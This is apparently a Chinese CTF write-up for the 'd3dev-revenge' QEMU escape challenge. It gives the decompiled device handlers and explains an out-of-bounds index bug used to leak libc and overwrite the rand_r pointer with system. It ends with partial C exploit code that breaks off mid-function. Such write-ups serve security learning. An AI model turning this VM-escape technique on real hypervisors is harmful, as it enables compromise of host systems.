        <content type="html"><![CDATA[<h2 id="d3dev"><a href="#d3dev" class="headerlink" title="d3dev"></a>d3dev</h2><p>这里没有加<code>monitor=/dev/null</code>，所以可以直接通过<code>CRTL_ALT_2</code>进入控制台。</p><h2 id="d3dev-revenge"><a href="#d3dev-revenge" class="headerlink" title="d3dev-revenge"></a>d3dev-revenge</h2><p><code>qemu逃逸</code></p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>首先看一下启动脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">./qemu-system-x86_64 \</span><br><span class="line">-L pc-bios/ \</span><br><span class="line">-m 128M \</span><br><span class="line">-kernel vmlinuz \</span><br><span class="line">-initrd rootfs.img \</span><br><span class="line">-smp 1 \</span><br><span class="line">-append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 nokaslr quiet&quot;</span> \</span><br><span class="line">-device d3dev \</span><br><span class="line">-netdev user,<span class="built_in">id</span>=t0, -device e1000,netdev=t0,<span class="built_in">id</span>=nic0 \</span><br><span class="line">-nographic \</span><br><span class="line">-monitor /dev/null</span><br></pre></td></tr></table></figure><p>我们看到这里的<code>device</code>的名称是<code>d3dev</code>，<code>ida</code>看一下相关的函数，发现存在<code>mmio/pmio</code>两种方式，分别分析一下，首先看一下<code>pmio_read</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint64_t</span> __fastcall <span class="title function_">d3dev_pmio_read</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uint64_t</span> result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( addr &gt; <span class="number">0x18</span> )</span><br><span class="line">    result = <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = ((__int64 (__fastcall *)(<span class="type">void</span> *))((<span class="type">char</span> *)dword_7ADF30 + dword_7ADF30[addr]))(opaque);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里看发生了一个未知的调用，采用的应该是函数表的形式，不过这里不重要，接下来看一下<code>pmio_write</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">d3dev_pmio_write</span><span class="params">(d3devState *opaque, hwaddr cmd, <span class="type">uint64_t</span> val, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uint32_t</span> *v4; <span class="comment">// rbp</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( cmd == <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( val &lt;= <span class="number">0x100</span> )</span><br><span class="line">      opaque-&gt;seek = val;                       <span class="comment">// 设定seek</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( cmd &gt; <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( cmd == <span class="number">0x1C</span> )                          <span class="comment">// 随机生成key</span></span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;r_seed = val;</span><br><span class="line">      v4 = opaque-&gt;key;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">        *v4++ = ((__int64 (__fastcall *)(<span class="type">uint32_t</span> *, __int64, <span class="type">uint64_t</span>, _QWORD))opaque-&gt;rand_r)(</span><br><span class="line">                  &amp;opaque-&gt;r_seed,</span><br><span class="line">                  <span class="number">0x1C</span>LL,</span><br><span class="line">                  val,</span><br><span class="line">                  *(_QWORD *)&amp;size);</span><br><span class="line">      <span class="keyword">while</span> ( v4 != (<span class="type">uint32_t</span> *)&amp;opaque-&gt;rand_r );</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( cmd )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( cmd == <span class="number">4</span> )                             <span class="comment">// 清空两个key</span></span><br><span class="line">    &#123;</span><br><span class="line">      *(_QWORD *)opaque-&gt;key = <span class="number">0LL</span>;</span><br><span class="line">      *(_QWORD *)&amp;opaque-&gt;key[<span class="number">2</span>] = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    opaque-&gt;memory_mode = val;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里涉及到了<code>d3devState</code>数据结构，看一下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> d3devState      struc ; (<span class="keyword">sizeof</span>=<span class="number">0x1300</span>, align=<span class="number">0x10</span>, copyof_4545)</span><br><span class="line"><span class="number">00000000</span> pdev            PCIDevice_0 ?</span><br><span class="line"><span class="number">000008E0</span> mmio            MemoryRegion_0 ?</span><br><span class="line"><span class="number">000009</span>D0 pmio            MemoryRegion_0 ?</span><br><span class="line"><span class="number">00000</span>AC0 memory_mode     dd ?</span><br><span class="line"><span class="number">00000</span>AC4 seek            dd ?</span><br><span class="line"><span class="number">00000</span>AC8 init_flag       dd ?</span><br><span class="line"><span class="number">00000</span>ACC mmio_read_part  dd ?</span><br><span class="line"><span class="number">00000</span>AD0 mmio_write_part dd ?</span><br><span class="line"><span class="number">00000</span>AD4 r_seed          dd ?</span><br><span class="line"><span class="number">00000</span>AD8 blocks          dq <span class="number">257</span> dup(?)</span><br><span class="line"><span class="number">000012E0</span> key             dd <span class="number">4</span> dup(?)</span><br><span class="line"><span class="number">000012F</span>0 rand_r          dq ?                    ; offset</span><br><span class="line"><span class="number">000012F</span>8                 db ? ; undefined</span><br><span class="line"><span class="number">000012F</span>9                 db ? ; undefined</span><br><span class="line"><span class="number">000012F</span>A                 db ? ; undefined</span><br><span class="line"><span class="number">000012F</span>B                 db ? ; undefined</span><br><span class="line"><span class="number">000012F</span>C                 db ? ; undefined</span><br><span class="line"><span class="number">000012F</span>D                 db ? ; undefined</span><br><span class="line"><span class="number">000012F</span>E                 db ? ; undefined</span><br><span class="line"><span class="number">000012F</span>F                 db ? ; undefined</span><br><span class="line"><span class="number">00001300</span> d3devState      ends</span><br></pre></td></tr></table></figure><p>这里是根据<code>cmd</code>的值来达到不同的功能</p><ul><li><code>cmd=8</code>，设定<code>seek</code>的值，这里的<code>seek&lt;0x100</code></li><li><code>cmd=0x1c</code>，更新加解密所需要的<code>key</code>，这里是直接调用的数据结构中的<code>rand_r</code>函数指针来完成的</li><li><code>cmd=4</code>，这里清空了<code>key</code>，所有的<code>key</code>均为<code>0</code>，注意到这里其实我们就可以实现加解密了，因为所有的<code>key</code>都是<code>0</code></li></ul><p>接下来看一下<code>mmio_read</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint64_t</span> __fastcall <span class="title function_">d3dev_mmio_read</span><span class="params">(d3devState *opaque, hwaddr addr, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uint64_t</span> v; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> sum; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">uint64_t</span> v0; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v = opaque-&gt;blocks[opaque-&gt;seek + (<span class="type">unsigned</span> <span class="type">int</span>)(addr &gt;&gt; <span class="number">3</span>)];</span><br><span class="line">  sum = <span class="number">0xC6EF3720</span>;</span><br><span class="line">  v1 = v;</span><br><span class="line">  v0 = HIDWORD(v);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v0) = v0 - ((v1 + sum) ^ (opaque-&gt;key[<span class="number">3</span>] + (v1 &gt;&gt; <span class="number">5</span>)) ^ (opaque-&gt;key[<span class="number">2</span>] + <span class="number">16</span> * v1));</span><br><span class="line">    v1 -= (v0 + sum) ^ (opaque-&gt;key[<span class="number">1</span>] + ((<span class="type">unsigned</span> <span class="type">int</span>)v0 &gt;&gt; <span class="number">5</span>)) ^ (opaque-&gt;key[<span class="number">0</span>] + <span class="number">16</span> * v0);</span><br><span class="line">    sum += <span class="number">0x61C88647</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( sum );</span><br><span class="line">  <span class="keyword">if</span> ( opaque-&gt;mmio_read_part )</span><br><span class="line">  &#123;</span><br><span class="line">    opaque-&gt;mmio_read_part = <span class="number">0</span>;</span><br><span class="line">    v0 = (<span class="type">unsigned</span> <span class="type">int</span>)v0;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    opaque-&gt;mmio_read_part = <span class="number">1</span>;</span><br><span class="line">    v0 = v1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是根据输入的<code>addr&gt;&gt;3</code>作为<code>offset</code>读取<code>blocks</code>中的相关内容，读取的内容进行了加密处理，很容易可以看出来这里的加密算法是<code>tea</code>的解密算法。<code>tea</code>的加解密算法可以参考<a href="https://www.jianshu.com/p/4272e0805da3">这里</a></p><p>需要注意的这里需要读取两次才能够获得完整的加密<code>8</code>字节数据。接下来看一下<code>mmio_write</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">d3dev_mmio_write</span><span class="params">(d3devState *opaque, hwaddr addr, <span class="type">uint64_t</span> val, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 offset; <span class="comment">// rsi</span></span><br><span class="line">  ObjectClass_0 **opaque_address; <span class="comment">// r11</span></span><br><span class="line">  <span class="type">uint64_t</span> v6; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">uint32_t</span> key0; <span class="comment">// er10</span></span><br><span class="line">  <span class="type">uint32_t</span> key1; <span class="comment">// er9</span></span><br><span class="line">  <span class="type">uint32_t</span> key2; <span class="comment">// er8</span></span><br><span class="line">  <span class="type">uint32_t</span> key3; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v12; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">uint64_t</span> result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    offset = opaque-&gt;seek + (<span class="type">unsigned</span> <span class="type">int</span>)(addr &gt;&gt; <span class="number">3</span>);</span><br><span class="line">    <span class="keyword">if</span> ( opaque-&gt;mmio_write_part )</span><br><span class="line">    &#123;</span><br><span class="line">      opaque_address = &amp;opaque-&gt;pdev.qdev.parent_obj.class + offset;</span><br><span class="line">      v6 = val &lt;&lt; <span class="number">32</span>;</span><br><span class="line">      v7 = <span class="number">0</span>;</span><br><span class="line">      opaque-&gt;mmio_write_part = <span class="number">0</span>;</span><br><span class="line">      key0 = opaque-&gt;key[<span class="number">0</span>];</span><br><span class="line">      key1 = opaque-&gt;key[<span class="number">1</span>];</span><br><span class="line">      key2 = opaque-&gt;key[<span class="number">2</span>];</span><br><span class="line">      key3 = opaque-&gt;key[<span class="number">3</span>];</span><br><span class="line">      v12 = v6 + *((_DWORD *)opaque_address + <span class="number">0x2B6</span>);</span><br><span class="line">      result = ((<span class="type">unsigned</span> __int64)opaque_address[<span class="number">0x15B</span>] + v6) &gt;&gt; <span class="number">32</span>;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        v7 -= <span class="number">0x61C88647</span>;</span><br><span class="line">        v12 += (v7 + result) ^ (key1 + ((<span class="type">unsigned</span> <span class="type">int</span>)result &gt;&gt; <span class="number">5</span>)) ^ (key0 + <span class="number">16</span> * result);</span><br><span class="line">        LODWORD(result) = ((v7 + v12) ^ (key3 + (v12 &gt;&gt; <span class="number">5</span>)) ^ (key2 + <span class="number">16</span> * v12)) + result;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v7 != <span class="number">0xC6EF3720</span> );</span><br><span class="line">      opaque_address[<span class="number">0x15B</span>] = (ObjectClass_0 *)__PAIR64__(result, v12);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;mmio_write_part = <span class="number">1</span>;</span><br><span class="line">      opaque-&gt;blocks[offset] = (<span class="type">unsigned</span> <span class="type">int</span>)val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里与<code>mmio_read</code>类似，虽然这里的<code>ida</code>反汇编显示有点问题，但是根据调试可以知道这里的功能就是将用户输入的数据进行解密。解密算法就是<code>tea</code>的加密算法（反向理解也可以，写入加密，读取解密）将解密后的数据写入到<code>blocks[seek+offset]</code>中。这里也提供了直接写入的 分支，不过只能写入四子节。</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>这里可以很明显的发现一个索引越界漏洞，即<code>seek</code>最大为<code>0x100</code>，但是对用户输入的<code>offset</code>没有进行限制，而<code>blocks</code>的大小为<code>0x101</code>，也就是这里可以直接越界对<code>d3devState</code>结构体进行读写。</p><p>很容易的我们发现可以读取器中的<code>rand_r</code>函数指针泄漏出<code>libc</code>的基址，进而得到<code>system</code>的地址，然后可以将<code>rand_r</code>函数指针覆写为<code>system</code>，之后在进行<code>pmio_write</code>中调用<code>rand_r</code>函数指针即可执行命令。</p><p>按照后门函数的调用逻辑，命令参数只能写到<code>seed</code>的位置，而注意到<code>seed</code>和<code>blocks</code>位置相邻，因此我们可以利用字符串拼接的方法执行任意长度的<code>cmd</code>，这里将<code>seed</code>写为<code>ls &amp;</code>而真正执行的命令在<code>blocks[0]</code>位置处。</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* mmio_mem;</span><br><span class="line"><span class="type">uint32_t</span> mmio_addr = <span class="number">0xfebf1000</span>;</span><br><span class="line"><span class="type">uint32_t</span> mmio_size = <span class="number">0x800</span>;</span><br><span class="line"><span class="type">int32_t</span> pmio_base = <span class="number">0xc040</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">die</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">mem_map</span><span class="params">( <span class="type">const</span> <span class="type">char</span>* dev, <span class="type">size_t</span> offset, <span class="type">size_t</span> size )</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> fd = open( dev, O_RDWR | O_SYNC );</span><br><span class="line">    <span class="keyword">if</span> ( fd == <span class="number">-1</span> ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span>* result = mmap( <span class="literal">NULL</span>, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, offset );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( !result ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    close( fd );</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">uint64_t</span> value, <span class="type">int</span> choice)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (choice == <span class="number">0</span>)&#123;</span><br><span class="line">        *((<span class="type">uint8_t</span>*)(mmio_mem + addr)) = value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (choice == <span class="number">1</span>)&#123;</span><br><span class="line">        *((<span class="type">uint16_t</span>*)(mmio_mem + addr)) = value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (choice == <span class="number">2</span>)&#123;</span><br><span class="line">        *((<span class="type">uint32_t</span>*)(mmio_mem + addr)) = value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (choice == <span class="number">3</span>)&#123;</span><br><span class="line">        *((<span class="type">uint64_t</span>*)(mmio_mem + addr)) = value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint32_t</span> addr, <span class="type">int</span> choice)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(choice == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> *((<span class="type">uint8_t</span>*)(mmio_mem + addr));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(choice == <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> *((<span class="type">uint16_t</span>*)(mmio_mem + addr));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(choice == <span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> *((<span class="type">uint32_t</span>*)(mmio_mem + addr));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(choice == <span class="number">3</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> *((<span class="type">uint64_t</span>*)(mmio_mem + addr));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pmio_write</span><span class="params">(<span class="type">uint32_t</span> addr, <span class="type">uint32_t</span> value)</span></span><br><span class="line">&#123;</span><br><span class="line">    outl(value,pmio_base + addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span> <span class="title function_">pmio_read</span><span class="params">(<span class="type">uint32_t</span> addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">uint32_t</span>)inl(pmio_base + addr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//加密函数  </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">my_tea_encrypt</span> <span class="params">(<span class="type">uint32_t</span>* v, <span class="type">uint32_t</span>* k)</span> &#123;  </span><br><span class="line">    <span class="type">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>];</span><br><span class="line">    <span class="type">int</span> sum=<span class="number">0xC6EF3720</span>, i;           <span class="comment">/* set up */</span>  </span><br><span class="line">    <span class="type">uint32_t</span> k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];   <span class="comment">/* cache key */</span>  </span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">        v1 -= ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3);  </span><br><span class="line">        v0 -= ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);  </span><br><span class="line">        sum += <span class="number">0x61C88647</span>;  </span><br><span class="line">    &#125;<span class="keyword">while</span>(sum);                                            <span class="comment">/* end cycle */</span>  </span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;  </span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//解密函数  </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">my_tea_decrypt</span> <span class="params">(<span class="type">uint32_t</span>* v, <span class="type">uint32_t</span>* k)</span> &#123;  </span><br><span class="line">    <span class="type">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>];</span><br><span class="line">    <span class="type">int</span> sum=<span class="number">0</span>, i;  <span class="comment">/* set up */</span>  </span><br><span class="line">    <span class="type">uint32_t</span> k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];   <span class="comment">/* cache key */</span>  </span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">        sum -= <span class="number">0x61C88647</span>;  </span><br><span class="line">        v0 += ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);  </span><br><span class="line">        v1 += ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3);  </span><br><span class="line">    &#125;<span class="keyword">while</span>(sum != <span class="number">0xC6EF3720</span>);                                              <span class="comment">/* end cycle */</span>  